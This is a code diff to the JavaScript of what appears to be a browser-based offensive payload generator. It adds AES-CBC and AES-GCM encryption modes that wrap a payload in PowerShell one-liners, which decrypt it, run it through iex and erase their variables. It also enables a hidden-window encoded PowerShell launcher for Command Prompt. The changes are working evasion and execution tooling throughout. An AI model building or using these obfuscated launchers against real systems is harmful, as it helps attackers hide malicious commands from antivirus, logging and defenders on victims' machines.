@@ -27,9 +27,75 @@ function toBase64(str) {
     return btoa(byteStr);
 }
 
-function obfsBase64(payload, cli) {
+async function obfsAesCbc(payload, cli) {
     if (cli === 'Command Prompt') {
         return '# No available on Command Prompt';
+    } else {
+        const key = await window.crypto.subtle.generateKey(
+            {
+                name: "AES-CBC",
+                length: 256,
+            },
+            true,
+            ["encrypt", "decrypt"],
+        );
+        const iv = window.crypto.getRandomValues(new Uint8Array(16));
+        const encrypted = await window.crypto.subtle.encrypt(
+            {
+                name: "AES-CBC",
+                iv: iv,
+            },
+            key,
+            new TextEncoder().encode(payload),
+        );
+
+        const keyArray = new Uint8Array(await window.crypto.subtle.exportKey('raw', key));
+
+        const encPayloadBase64 = btoa(String.fromCharCode(...new Uint8Array(encrypted)));
+        const keyBase64 = btoa(String.fromCharCode(...keyArray));
+        const ivBase64 = btoa(String.fromCharCode(...iv));
+        return `$encBytes = [Convert]::FromBase64String("${encPayloadBase64}");$aes = [System.Security.Cryptography.Aes]::Create();$aes.Key = $([Convert]::FromBase64String("${keyBase64}"));$aes.IV = $([Convert]::FromBase64String("${ivBase64}"));$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$decryptor = $aes.CreateDecryptor();$decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length);iex $([System.Text.Encoding]::UTF8.GetString($decBytes));Remove-Variable -Name "encBytes";Remove-Variable -Name "aes";Remove-Variable -Name "decryptor";Remove-Variable -Name "decBytes"`;
+    }
+}
+
+async function obfsAesGcm(payload, cli) {
+    if (cli === 'Command Prompt') {
+        return '# No available on Command Prompt';
+    } else {
+        const key = await window.crypto.subtle.generateKey(
+            {
+                name: "AES-GCM",
+                length: 256,
+            },
+            true,
+            ["encrypt", "decrypt"],
+        );
+        const nonce = window.crypto.getRandomValues(new Uint8Array(12));
+        const encrypted = await window.crypto.subtle.encrypt(
+            {
+                name: "AES-GCM",
+                iv: nonce,
+            },
+            key,
+            new TextEncoder().encode(payload),
+        );
+
+        const keyArray = new Uint8Array(await window.crypto.subtle.exportKey('raw', key));
+        const authTag = new Uint8Array(encrypted.slice(-16));
+        const encPayload = new Uint8Array(encrypted.slice(0, -16));
+
+        const keyBase64 = btoa(String.fromCharCode(...keyArray));
+        const nonceBase64 = btoa(String.fromCharCode(...nonce));
+        const authTagBase64 = btoa(String.fromCharCode(...authTag));
+        const encPayloadBase64 = btoa(String.fromCharCode(... new Uint8Array(encPayload)));
+        return `$encPayload = [Convert]::FromBase64String("${encPayloadBase64}");$key = [Convert]::FromBase64String("${keyBase64}");$nonce = [Convert]::FromBase64String("${nonceBase64}");$authTag = [Convert]::FromBase64String("${authTagBase64}");$payload = New-Object byte[] ($encPayload.Length);$aes = [System.Security.Cryptography.AesGcm]::new($key);$aes.Decrypt($nonce, $encPayload, $authTag, $payload);iex $([System.Text.Encoding]::UTF8.GetString($payload));Remove-Variable -Name "encPayload";Remove-Variable -Name "key";Remove-Variable -Name "nonce";Remove-Variable -Name "authTag";Remove-Variable -Name "aes";Remove-Variable -Name "payload"`;
+    }
+}
+
+function obfsBase64(payload, cli) {
+    if (cli === 'Command Prompt') {
+        // return '# No available on Command Prompt';
+        return `powershell.exe -nop -noni -w hid -e ${toBase64(payload)}`;
     } else {
         return `powershell.exe -nop -noni -w hid -e ${toBase64(payload)}`;
     }
@@ -56,8 +122,12 @@ function obfsSplit(payload, cli) {
     }
 }
 
-function obfs(payload, cli, optObfs) {
+async function obfs(payload, cli, optObfs) {
     switch (optObfs) {
+        case 'AES-CBC':
+            return await obfsAesCbc(payload, cli);
+        case 'AES-GCM':
+            return await obfsAesGcm(payload, cli);
         case 'Base64':
             return obfsBase64(payload, cli);
         case 'Split':
@@ -106,18 +176,18 @@ function genPayload1(optPurpose, optBin) {
     elemAdmin.style.display = adminRequired ? 'inline' : 'none';
     // Update the display of the cli label element.
     const elemCli = document.getElementById('payload_1_pre_labels_cli');
-    // Update the payload element
-    const elemCode = document.getElementById('payload_1_pre_code');
-    elemCode.textContent = payload;
     if (cli) {
         elemCli.style.display = 'inline';
         elemCli.textContent = 'Run on ' + cli;
     } else {
         elemCli.style.display = 'none';
     }
+    // Update the payload element
+    const elemCode = document.getElementById('payload_1_pre_code');
+    elemCode.textContent = payload;
 }
 
-function genPayload2() {
+async function genPayload2() {
     const optPurpose = document.getElementById('options_1_purpose').value;
     const optBin = document.getElementById('options_1_bin').value;
     let payload = document.getElementById('payload_1_pre_code').innerText;
@@ -128,17 +198,8 @@ function genPayload2() {
     const adminRequired = target['adminRequired'];
     const mitre = target['mitre'];
 
-    payload = obfs(payload, cli, optObfs);
+    payload = await obfs(payload, cli, optObfs);
 
-    // // Update the ATT&CK ID element
-    // const elemMitreLink = document.getElementById('options_2_mitre_link');
-    // if (mitre) {
-    //     elemMitreLink.href = mitre['url'];
-    //     elemMitreLink.textContent = mitre['id'];
-    //     elemMitreLink.style.display = ''
-    // } else {
-    //     elemMitreLink.style.display = 'none';
-    // }
     // Update the payload element
     const elemCode = document.getElementById('payload_2_pre_code');
     elemCode.textContent = payload;
@@ -155,24 +216,24 @@ function genPayload2() {
     }
 }
 
-function update1() {
+async function update1() {
     const optPurpose = document.getElementById('options_1_purpose').value;
     const optBin = document.getElementById('options_1_bin').value;
 
     genPayload1(optPurpose, optBin);
     const optObfs = document.getElementById('options_2_obfs').value;
-    genPayload2(optObfs);
+    await genPayload2(optObfs);
 }
 
-function update2() {
+async function update2() {
     const optObfs = document.getElementById('options_2_obfs').value;
-    genPayload2(optObfs);
+    await genPayload2(optObfs);
 }
 
-function updatePurpose() {
+async function updatePurpose() {
     const optPurpose = document.getElementById('options_1_purpose').value;
     updateSelectBinElem(optPurpose);
-    update1();
+    await update1();
 }
 
 function showPopup() {
